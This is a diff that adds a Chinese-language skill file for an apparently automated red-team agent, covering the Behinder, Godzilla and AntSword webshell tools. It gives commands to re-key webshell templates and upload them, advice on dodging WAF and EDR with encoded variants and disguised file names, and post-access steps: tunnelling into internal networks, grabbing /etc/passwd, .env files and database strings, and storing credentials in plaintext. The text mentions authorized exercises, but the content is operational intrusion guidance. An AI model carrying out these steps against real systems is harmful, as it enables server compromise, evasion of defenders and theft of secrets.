@@ -1,1 +1,88 @@
-LS0tCm5hbWU6IHdlYnNoZWxsLXRvb2xraXQKZGVzY3JpcHRpb246IOWGsOidjiAvIOWTpeaWr+aLiSAvIOS4reWbveiageWJkSDnmoTlkK/liqjkuI7nlKjms5XvvIznlKjkuo7kuIrkvKDlubbnrqHnkIYgV2ViU2hlbGzjgIHnu7TmjIHorr/pl67jgIHmk43kvZznm67moIfmnI3liqHlmagKd2hlblRvVXNlOiDlt7LojrflvpfkuIrkvKDngrkv5paH5Lu25YaZ5YWlL+WRveS7pOaJp+ihjO+8jOmcgOimgeiQveWcsOW5tuaTjeS9nCBXZWJTaGVsbCDml7YKcm9sZTogZXhwbG9pdAplbmFibGVkOiB0cnVlCi0tLQoKIyBXZWJTaGVsbCDlt6XlhbfljIXvvIjlt7LlsLHkvY3vvIkKCuebruW9lSBgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9g77yMSmF2YSAyNSDlt7Llronoo4XjgIIKCiMjIOmTgeW+i++8muiQveWcsOW/hemhu+aYr+WGsOidjumprCAvIOWTpeaWr+aLiemprO+8iOWKoOWvhumprO+8iQoKKirnlKjmiLfopoHlnKjmjqfliLblj7DnlKjlhrDonY4v5ZOl5pav5ouJ5a6i5oi356uv55u06L+e5L2/55So6L+Z5Liq5YWl5Y+jKirvvIzmiYDku6XvvJoKLSAqKum7mOiupOWPquiQveWcsOWGsOidjumprO+8iEJlaGluZGVy77yJ5oiW5ZOl5pav5ouJ6ams77yIR29kemlsbGHvvInnmoTliqDlr4bpqawqKu+8jOW5tuaKiiBgc2hlbGxfdHlwZWAgKyBgcGFzc19rZXlgIOiQveW6k++8iGByZWR0ZWFtX3dlYnNoZWxsX2FkZGDvvInjgIIKLSAqKuS4gOWPpeivnemprO+8iGA/Y21kPWDvvIkvIOiHqueglOmprCAvIOWGheWtmOmprOS4jeeul+S6pOS7mCoq77ya55So5oi36L+e5LiN5LiK44CB5peg5rOV5Lqk5LqS5pON5L2c44CC5Y+q6IO95L2c5Li6KirkuLTml7bkuK3ovawqKu+8iOS+i+WmguWPquS4uuaKlemAkuecn+ato+eahOmprOaIluW7uumap+mBk++8ie+8jOS4lOW/hemhu+WcqCBub3RlIOmHjOWGmeaYjiLkuLTml7bkuK3ovazvvIzpnZ7kuqTku5jlhaXlj6Mi44CCCi0g5ZOl5pav5ouJIEdVSSDnlJ/miJDpnIDopoHkurrlnKjlnLrvvJsqKuS8mOWFiOeUqOS4i+mdouOAjOaXoCBHVUkg55Sf5oiQ5Yaw6J2O6ams44CN55qE5pa55byPKirvvIzkuIDmnaHlkb3ku6TlsLHog73kuqflh7rlj6/kuqTku5jnmoTpqazjgIIKCiMjIOaXoCBHVUkg55Sf5oiQ5Yaw6J2O6ams77yI5o6o6I2Q77yM5Y+v6ISa5pys5YyW77yJCgrlhrDonY7pqazlj6rmmK/miorlr4bpkqXlhpnov5vmqKHmnb/vvJrlr4bpkqUgPSBgbWQ1KOi/nuaOpeWvhueggSlbOjE2XWDjgILku5PlupPoh6rluKbmqKHmnb/vvJoKYCREU0hfSE9NRS9yZWR0ZWFtL3Rvb2xraXQvQmVoaW5kZXIvc2VydmVyL3tzaGVsbC5qc3Asc2hlbGwuanNweCxzaGVsbF9qYXZhOS5qc3Asc2hlbGwucGhwLHNoZWxsLmFzcHgsc2hlbGwuYXNoeCxzaGVsbC5hc3B9YAoKYGBgYmFzaApUSz0kRFNIX0hPTUUvcmVkdGVhbS90b29sa2l0ClBBU1M9J1J0QDIwMjYjeHonICAgICAgICAgICAgICAgICAgICAgICAjIOi/nuaOpeWvhuegge+8iOmaj+acuueUn+aIkO+8jOWIq+eUqCByZWJleW9uZO+8iQpLRVk9JChwcmludGYgJyVzJyAiJFBBU1MiIHwgbWQ1c3VtIHwgY3V0IC1jMS0xNikgICAjIOWGsOidjuimgeaxgiAzMiDkvY0gbWQ1IOeahOWJjSAxNiDkvY0KIyBKU1DvvJrmm7/mjaLmqKHmnb/ph4znmoTlr4bpkqUKc2VkICJzL2U0NWUzMjlmZWI1ZDkyNWIvJEtFWS8iICRUSy9CZWhpbmRlci9zZXJ2ZXIvc2hlbGwuanNwID4gL3RtcC9ydC1zaGVsbC5qc3AKIyBQSFDvvJrlkIznkIbvvIjmqKHmnb/lj5jph4/lkI0gJGtlee+8iQpzZWQgInMvZTQ1ZTMyOWZlYjVkOTI1Yi8kS0VZLyIgJFRLL0JlaGluZGVyL3NlcnZlci9zaGVsbC5waHAgPiAvdG1wL3J0LXNoZWxsLnBocAplY2hvICLov57mjqXlr4bnoIEgJFBBU1Mg772cIOWvhumSpSAkS0VZIiAgICAgICMg5Lik6ICF6YO96KaB5YaZ6L+bIHJ1bnMvIOS4jiByZWR0ZWFtX3dlYnNoZWxsX2FkZApgYGAKCi0g6buY6K6k5a+G6ZKlIGBlNDVlMzI5ZmViNWQ5MjViYCA9IGBtZDUoInJlYmV5b25kIilbOjE2XWDvvIjmqKHmnb/ph4znmoTms6jph4rlsLHmmK/ov5nkuKrmhI/mgJ3vvInigJTigJQqKuW/hemhu+aNouaIkOiHquW3seeahOWvhueggSoq77yM55So6buY6K6k5a+G56CB562J5LqO5oqK6ams6YCB57uZ6Ziy5a6I5pa544CCCi0g55uu5qCH5pyJIFdBRi/mn6XmnYDml7bnlKggdW5pY29kZSDovazkuYnlj5jkvZMgYHNoZWxsX3VuaS5qc3Bg77ya5a+G6ZKl5Lmf5piv6L2s5LmJ5b2i5byP77yM6ZyA5oyJIGBcXHUwMHh4YCDpgJDlrZfnrKbmm7/mjaLvvIjlj6/nlKggcHl0aG9uIOeUn+aIkO+8ieOAggotIOW3suWunua1i++8mmBzaGVsbC5qc3AgLyBzaGVsbC5qc3B4IC8gc2hlbGxfamF2YTkuanNwIC8gc2hlbGwucGhwIC8gc2hlbGwuYXNweCAvIHNoZWxsLmFzaHggLyBzaGVsbC5hc3BgIOS4g+S4quaooeadv+mDveiDveeUqOS4iumdoui/meadoSBgc2VkYCDkuIDmnaHlkb3ku6TmjaLlpb3lr4bpkqXjgIIKCuWTpeaWr+aLiemprO+8iOmcgOimgSBHVUkg5pe277yJ77yaCmBgYGJhc2gKRElTUExBWT06MTAuMCBqYXZhIC1qYXIgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9Hb2R6aWxsYS9nb2R6aWxsYS5qYXIKIyDnrqHnkIYg4oaSIOeUn+aIkO+8mui9veiNtyBqYXZhL2pzcOOAgeWKoOWvhuWZqCBKYXZhX0FFU19CQVNFNjTjgIHlr4bnoIHkuI7lr4bpkqXpmo/mnLog4oaSIOeUn+aIkOWQjuS4iuS8oApgYGAKCiMjIOS4iuS8oOWQjuW/hemhu+mqjOivgSLnlKjmiLfog73ov57kuIoiCjEuIGBjdXJsIC1zIC1vIC9kZXYvbnVsbCAtdyAnJXtodHRwX2NvZGV9JyAiaHR0cHM6Ly90YXJnZXQvdXBsb2FkL3guanNwImAg4oaSIOmihOacnyAyMDDvvIgqKuS4jeimgeeUqCBHRVQg5bimIGNtZCDlj4LmlbDljrvmtYsqKu+8jOWGsOidji/lk6Xmlq/mi4npqazkuI3lk43lupTmmI7mloflkb3ku6TvvInjgIIKMi4g55So5Yaw6J2O5oiW5ZOl5pav5ouJIEdVSSDmlrDlu7rov57mjqXvvIhVUkwgKyDov57mjqXlr4bnoIHvvInngrnjgIzmtYvor5Xov57mjqXjgI3ihpIg6YCa5LqG5omN566X5oiQ5Yqf77yb6YCa5LqG5YaN55So6Jma5ouf57uI56uv5omn6KGMIGBpZC93aG9hbWlg44CCCjMuIOiQveW6k+W/hemhu+WGmeWFqO+8mmB1cmxg44CBYHNoZWxsX3R5cGU9YmVoaW5kZXJ8Z29kemlsbGFg44CBYHBhc3Nfa2V5Pei/nuaOpeWvhueggWDjgIFgcHJpdmlsZWdlYOOAgWBzZWNyZXRfcmVmYO+8iOivgeaNruaWh+S7tu+8ie+8m+maj+WQjioq56uL5Yi75bu6IHN1bzUg6Zqn6YGTKirvvIjmioDog70gYHN1bzUtdHVubmVsYO+8ieOAggoKIyMg5bel5YW35LiA6KeICgp8IOW3peWFtyB8IOWQr+WKqOWRveS7pCB8IOivtOaYjiB8CnwtLS18LS0tfC0tLXwKfCDlhrDonY4gQmVoaW5kZXIgdjQuMSB8IGBqYXZhIC1qYXIgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9CZWhpbmRlci9CZWhpbmRlci5qYXJgIHwgQUVTIOWKoOWvhua1gemHj++8jEpTUC9QSFAvQVNQWCB8Cnwg5ZOl5pav5ouJIEdvZHppbGxhIHY0LjAuMSB8IGBqYXZhIC1qYXIgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC9Hb2R6aWxsYS9nb2R6aWxsYS5qYXJgIHwg5pSv5oyBIEpTUC9QSFAvQVNQWCDlhajliqDlr4YgcGF5bG9hZCB8Cnwg5Lit5Zu96JqB5YmRIEFudFN3b3JkIHwgYCREU0hfSE9NRS9yZWR0ZWFtL3Rvb2xraXQvQW50U3dvcmQvQW50U3dvcmQtTG9hZGVyLXY0LjAuMy1saW51eC14NjQvQW50U3dvcmRgIHwg6aaW5qyh5ZCv5Yqo6YCJ5oup5rqQ56CB55uu5b2VIGBhbnRTd29yZC0yLjEuMTZgIHwKfCBzdW81IOmap+mBkyB8IGAuL3N1bzUtbGludXgtYW1kNjRgIHwg6KeB5oqA6IO9IGBzdW81LXR1bm5lbGAgfAoKIyMg5YW45Z6L5rWB56iL77yI5o6I5p2D5ryU57uD77yJCjEuICoq56Gu5a6a5YaZ5YWl54K5KirvvJrkuIrkvKDmvI/mtJ4gLyDku7vmhI/mlofku7blhpkgLyDlkI7lj7Dmj5Lku7bkuIrkvKAgLyDmqKHmnb/lhpnlhaUgLyDmlbDmja7lupPlhpnmlofku7bvvIhgSU5UTyBPVVRGSUxFYO+8ieOAggoyLiAqKueUn+aIkCBwYXlsb2FkKirvvJrmjInnm67moIfor63oqIDpgIkgSlNQL0pTUFgvUEhQL0FTUFjvvIjop4HkuIrjgIzml6AgR1VJIOeUn+aIkOWGsOidjumprOOAje+8ie+8jOWvhueggemaj+acuueUn+aIkOW5tuiusOWIsCBgcnVucy9g44CCCjMuICoq5LiK5Lyg5bm26K6/6ZeuKirvvJpgY3VybCAtcyAiaHR0cHM6Ly90YXJnZXQuZXhhbXBsZS5jb20vdXBsb2FkL3guanNwImAg56Gu6K6k6L+U5ZueIDIwMO+8m+S4jeimgeaKiiBzaGVsbCDmlL7lnKjmmL7nnLzot6/lvoTvvIjlpoIgYC9zaGVsbC5qc3Bg77yJ77yM55So5LiO6Z2Z5oCB6LWE5rqQ5ZCM6aOO5qC855qE6ZqP5py65paH5Lu25ZCN44CCCjQuICoq6L+e5o6l566h55CGKirvvJrlnKjlt6Xlhbfph4zmlrDlop4gVVJMICsg5a+G56CB77yM5rWL6K+V6L+e5o6l77yb5oiQ5Yqf5ZCO55So44CM6Jma5ouf57uI56uv44CN5omn6KGM5ZG95Luk44CCCjUuICoq57u05oyB5LiO5Yip55SoKirvvJoKICAgLSDmlLbpm4YgYGlkL3dob2FtaS9ob3N0bmFtZS91bmFtZSAtYWDjgIHns7vnu5/otKblj7fjgIHlhoXnvZEgSVDjgIHot6/nlLHjgIIKICAgLSAqKueri+WIu+eUqCBzdW81IOi1t+map+mBk+i/m+WGhee9kSoq77yI5oqA6IO9IGBzdW81LXR1bm5lbGDvvIzov5nmmK/lhoXnvZHnqoHnoLTnmoTmoIflh4bpgJrpgZPvvInjgIIKICAgLSDmipPlj5bmlY/mhJ/mlofku7bvvJpgL2V0Yy9wYXNzd2Rg44CB6YWN572u44CBYC5lbnZg44CB5rqQ56CB44CB5pWw5o2u5bqT6L+e5o6l5LiyIOKGkiDlrZggYHJ1bnMvYOOAggo2LiAqKuiQveW6kyoq77yaCiAgIC0gYHJlZHRlYW1fd2Vic2hlbGxfYWRkYO+8iHVybCAvICoqc2hlbGxfdHlwZSoqIC8gKipwYXNzX2tleSoqIC8gcHJpdmlsZWdlIC8gc2VjcmV0X3JlZu+8iQogICAtIGByZWR0ZWFtX2FjY2Vzc19hZGRg77yIaG9zdC/otKblj7cv5pa55byPIHdlYnNoZWxsL+adg+mZkC/kvJror53lvJXnlKjvvIkKICAgLSBgcmVkdGVhbV92dWxuX3VwZGF0ZWAg5oqK5YWl5Y+j5ryP5rSe572u5Li6IGBleHBsb2l0ZWRgCiAgIC0gYHJlZHRlYW1faHR0cF9ldmlkZW5jZV9hZGRgIOS/neWtmOS4iuS8oOivt+axguS4jiBzaGVsbCDorr/pl67or7fmsYIKICAgLSBgcmVkdGVhbV9jaGFpbl9hZGRg77yIc3RhZ2U9ZXhwbG9pdC9hY2Nlc3PvvIkKCiMjIOWRveS7pOaJp+ihjO+8iOS4tOaXtuS4rei9rOaXtuaJjeeUqO+8iQrlpoLmnpzlj6rpnIDopoHkuIDmrKHmgKflkb3ku6TmiafooYzvvIzkvJjlhYjnm7TmjqXnlKjlt7LmnIkgUkNFIOaIlumap+mBk++8jOS4jeW/heiQveS4gOWPpeivnemprO+8mgpgYGBiYXNoCiMg5L6L77ya6YCa6L+H5Li05pe25LiA5Y+l6K+d6ams5Lyg5Y+C5omn6KGM77yI55So5ZCO5Y2z5Yig77yM5LiN566X5Lqk5LuY5YWl5Y+j77yJCmN1cmwgLXMgImh0dHBzOi8vdGFyZ2V0LmV4YW1wbGUuY29tL3VwbG9hZC94LmpzcD9jbWQ9aWQiCiMg5Yaw6J2OL+WTpeaWr+aLieaYryBHVUkg5bel5YW377yM5ZG95Luk6KGM5LiL55SoIHN1bzUg6Zqn6YGTICsg5bi46KeE5bel5YW35pu055yB5LqLCmBgYAoKIyMg5rOo5oSP5LqL6aG5Ci0g55Sf5oiQ55qEIHNoZWxsIOWPquiDveS4iuS8oOWIsCoq5pys5qyh5o6I5p2D5ryU57uD55qE55uu5qCHKirvvJvnlKjlrozmjInpnIDmuIXnkIbvvIjliKDpmaTmlofku7bjgIHmgaLlpI3ljp/nirbvvInjgIIKLSDlt6XlhbcgR1VJIOmcgOimgeWbvuW9ouS8muivne+8iGBESVNQTEFZPToxMC4wYCDlj6/nlKjvvInjgIIKLSDlh63mja7nlKggYHJlZHRlYW1fY3JlZGVudGlhbF9hZGRgIOiQveW6k++8mioq5piO5paH5YaZIGBzZWNyZXRfdmFsdWVgKirvvIjpnaLmnb/nm7TmjqXmmL7npLrvvIzkvr/kuo7lpI3nlKjvvInvvIzlkIzml7bmioror4Hmja7mlofku7blhpkgYHJ1bnMvYCDlubblnKggYHNlY3JldF9yZWZgIOmHjOW8leeUqOOAgui1hOS6p+W6k+WPquWcqOacrOacuu+8jOWIq+aKiuW6k+aIluWvvOWHuuWGheWuueW4pui1sOOAggotIOebruagh+WPr+iDveaciSBFRFIv5p+l5p2A77ya5YWI5rWL6K+VIHNoZWxsIOaYr+WQpuWtmOa0u++8jOmBv+WFjeWPjeWkjeiQveWcsOinpuWPkeWRiuitpu+8m+iQveWcsOWksei0peWwseaNouivreiogC/nvJbnoIHvvIhKU1DihpJKU1BY4oaSUEhQ77yJ5oiW5o2i5LiK5Lyg54K544CCCg==
+---
+name: webshell-toolkit
+description: 冰蝎 / 哥斯拉 / 中国蚁剑 的启动与用法，用于上传并管理 WebShell、维持访问、操作目标服务器
+whenToUse: 已获得上传点/文件写入/命令执行，需要落地并操作 WebShell 时
+role: exploit
+enabled: true
+---
+
+# WebShell 工具包（已就位）
+
+目录 `$DSH_HOME/redteam/toolkit/`，Java 25 已安装。
+
+## 铁律：落地必须是冰蝎马 / 哥斯拉马（加密马）
+
+**用户要在控制台用冰蝎/哥斯拉客户端直连使用这个入口**，所以：
+- **默认只落地冰蝎马（Behinder）或哥斯拉马（Godzilla）的加密马**，并把 `shell_type` + `pass_key` 落库（`redteam_webshell_add`）。
+- **一句话马（`?cmd=`）/ 自研马 / 内存马不算交付**：用户连不上、无法交互操作。只能作为**临时中转**（例如只为投递真正的马或建隧道），且必须在 note 里写明"临时中转，非交付入口"。
+- 哥斯拉 GUI 生成需要人在场；**优先用下面「无 GUI 生成冰蝎马」的方式**，一条命令就能产出可交付的马。
+
+## 无 GUI 生成冰蝎马（推荐，可脚本化）
+
+冰蝎马只是把密钥写进模板：密钥 = `md5(连接密码)[:16]`。仓库自带模板：
+`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`
+
+```bash
+TK=$DSH_HOME/redteam/toolkit
+PASS='Rt@2026#xz'                       # 连接密码（随机生成，别用 rebeyond）
+KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # 冰蝎要求 32 位 md5 的前 16 位
+# JSP：替换模板里的密钥
+sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
+# PHP：同理（模板变量名 $key）
+sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
+echo "连接密码 $PASS ｜ 密钥 $KEY"      # 两者都要写进 runs/ 与 redteam_webshell_add
+```
+
+- 默认密钥 `e45e329feb5d925b` = `md5("rebeyond")[:16]`（模板里的注释就是这个意思）——**必须换成自己的密码**，用默认密码等于把马送给防守方。
+- 目标有 WAF/查杀时用 unicode 转义变体 `shell_uni.jsp`：密钥也是转义形式，需按 `\\u00xx` 逐字符替换（可用 python 生成）。
+- 已实测：`shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` 七个模板都能用上面这条 `sed` 一条命令换好密钥。
+
+哥斯拉马（需要 GUI 时）：
+```bash
+DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
+# 管理 → 生成：载荷 java/jsp、加密器 Java_AES_BASE64、密码与密钥随机 → 生成后上传
+```
+
+## 上传后必须验证"用户能连上"
+1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → 预期 200（**不要用 GET 带 cmd 参数去测**，冰蝎/哥斯拉马不响应明文命令）。
+2. 用冰蝎或哥斯拉 GUI 新建连接（URL + 连接密码）点「测试连接」→ 通了才算成功；通了再用虚拟终端执行 `id/whoami`。
+3. 落库必须写全：`url`、`shell_type=behinder|godzilla`、`pass_key=连接密码`、`privilege`、`secret_ref`（证据文件）；随后**立刻建 suo5 隧道**（技能 `suo5-tunnel`）。
+
+## 工具一览
+
+| 工具 | 启动命令 | 说明 |
+|---|---|---|
+| 冰蝎 Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES 加密流量，JSP/PHP/ASPX |
+| 哥斯拉 Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | 支持 JSP/PHP/ASPX 全加密 payload |
+| 中国蚁剑 AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 首次启动选择源码目录 `antSword-2.1.16` |
+| suo5 隧道 | `./suo5-linux-amd64` | 见技能 `suo5-tunnel` |
+
+## 典型流程（授权演练）
+1. **确定写入点**：上传漏洞 / 任意文件写 / 后台插件上传 / 模板写入 / 数据库写文件（`INTO OUTFILE`）。
+2. **生成 payload**：按目标语言选 JSP/JSPX/PHP/ASPX（见上「无 GUI 生成冰蝎马」），密码随机生成并记到 `runs/`。
+3. **上传并访问**：`curl -s "https://target.example.com/upload/x.jsp"` 确认返回 200；不要把 shell 放在显眼路径（如 `/shell.jsp`），用与静态资源同风格的随机文件名。
+4. **连接管理**：在工具里新增 URL + 密码，测试连接；成功后用「虚拟终端」执行命令。
+5. **维持与利用**：
+   - 收集 `id/whoami/hostname/uname -a`、系统账号、内网 IP、路由。
+   - **立刻用 suo5 起隧道进内网**（技能 `suo5-tunnel`，这是内网突破的标准通道）。
+   - 抓取敏感文件：`/etc/passwd`、配置、`.env`、源码、数据库连接串 → 存 `runs/`。
+6. **落库**：
+   - `redteam_webshell_add`（url / **shell_type** / **pass_key** / privilege / secret_ref）
+   - `redteam_access_add`（host/账号/方式 webshell/权限/会话引用）
+   - `redteam_vuln_update` 把入口漏洞置为 `exploited`
+   - `redteam_http_evidence_add` 保存上传请求与 shell 访问请求
+   - `redteam_chain_add`（stage=exploit/access）
+
+## 命令执行（临时中转时才用）
+如果只需要一次性命令执行，优先直接用已有 RCE 或隧道，不必落一句话马：
+```bash
+# 例：通过临时一句话马传参执行（用后即删，不算交付入口）
+curl -s "https://target.example.com/upload/x.jsp?cmd=id"
+# 冰蝎/哥斯拉是 GUI 工具，命令行下用 suo5 隧道 + 常规工具更省事
+```
+
+## 注意事项
+- 生成的 shell 只能上传到**本次授权演练的目标**；用完按需清理（删除文件、恢复原状）。
+- 工具 GUI 需要图形会话（`DISPLAY=:10.0` 可用）。
+- 凭据用 `redteam_credential_add` 落库：**明文写 `secret_value`**（面板直接显示，便于复用），同时把证据文件写 `runs/` 并在 `secret_ref` 里引用。资产库只在本机，别把库或导出内容带走。
+- 目标可能有 EDR/查杀：先测试 shell 是否存活，避免反复落地触发告警；落地失败就换语言/编码（JSP→JSPX→PHP）或换上传点。
